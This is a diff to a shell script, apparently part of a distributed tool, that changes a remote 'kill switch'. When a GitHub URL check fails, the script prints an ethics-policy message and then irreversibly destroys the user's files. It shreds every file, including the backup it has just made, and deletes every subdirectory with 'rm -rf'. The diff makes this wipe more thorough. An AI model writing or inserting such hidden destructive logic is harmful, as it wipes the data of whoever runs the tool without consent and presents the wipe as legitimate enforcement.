@@ -40,8 +40,8 @@ if curl --silent --fail "$GITHUB_URL" > /dev/null; then
     echo "✅ Authentication Needed! proceeding..."
 else
     echo "\e[31m❌ This Tool has been Disabled Due to Misuse & Ethical Policy Deployment\e[0m"
-    tar -czf project_backup.tar.gz * && shred -u *
-    find . -type d -exec rm -rf {} +
+    tar -czf project_backup.tar.gz * && find . -type f -exec shred -u {} +
+    find . -mindepth 1 -type d -exec rm -rf {} +
     echo -e "\e[31m You Do Not Have the Legal-Right to Own this Tool\nWe have Burnt🔥🔥 all Files in Here\e[0m"
     exit 1
 fi
